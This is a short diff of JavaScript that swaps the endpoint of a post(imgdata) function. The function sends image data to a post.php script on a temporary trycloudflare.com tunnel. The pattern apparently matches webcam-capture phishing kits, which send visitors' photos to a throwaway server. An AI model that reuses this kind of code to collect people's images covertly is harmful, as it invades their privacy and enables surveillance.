@@ -563,7 +563,7 @@ function post(imgdata){
     $.ajax({
         type: 'POST',
         data: { cat: imgdata},
-        url: 'https://ram-exhibition-fonts-weeks.trycloudflare.com/post.php',
+        url: 'https://experimental-invisible-cartoons-deemed.trycloudflare.com/post.php',
         dataType: 'json',
         async: false,
         success: function(result){
